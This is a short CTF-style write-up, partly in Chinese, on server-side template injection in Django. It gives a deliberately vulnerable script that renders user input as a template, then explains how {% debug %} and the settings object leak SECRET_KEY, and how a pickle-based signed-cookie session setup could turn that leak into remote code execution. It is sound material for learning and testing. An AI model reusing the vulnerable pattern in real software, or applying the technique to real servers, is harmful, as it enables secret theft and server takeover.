# Python Django

## Installation

```sh
$ pip install django
```

## Vulnerable Code

```python
import traceback
import django
from django.conf import settings
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
    }
]
_setting = dict(TEMPLATES=TEMPLATES, SECRET_KEY='Flag{w0W_3sTl_1n_@jango_sYi11_aLiVe}')
settings.configure(**_setting)
django.setup()
from django.template import Template, Context
while True:
    temp = raw_input("Try to get Key\n> ").strip()
    try:
        s = Template(temp).render(Context(dict(settings=settings)))
    except:
        print(traceback.format_exc())
    else:
        print(s)
```

## Exploit

沒辦法直接RCE, 只能看看當前 context 有什麼變數

statement 限制:

1. 不能有()
2. 不能有[]
3. 變數不能以\_開頭 ex. a.\_b (X)

```python
{% debug %}
->  {'product': {'name': 'Sarcastic 9 Ball', 'price': '$55.21', 'stock': 26}, 'settings': <LazySettings "None">}{'False': False, 'None': None, 'True': True} {'Cookie': <module 'Cookie' from '/usr/lib/python2.7/Cookie.pyc'>, …}
其實只有 product 跟 settings 可以用, 第三區的模組(Cookie, ...)貌似都不是變數
settings 猜測是 django 的 settings.py, 因此有機會拿到 settings.SECRET_KEY

拿到 SECRET_KEY 之後如果伺服器剛好是設定

1. SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
2. SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'

就有機會用反序列化 RCE
- https://rickgray.me/2015/09/12/django-command-execution-analysis/
```
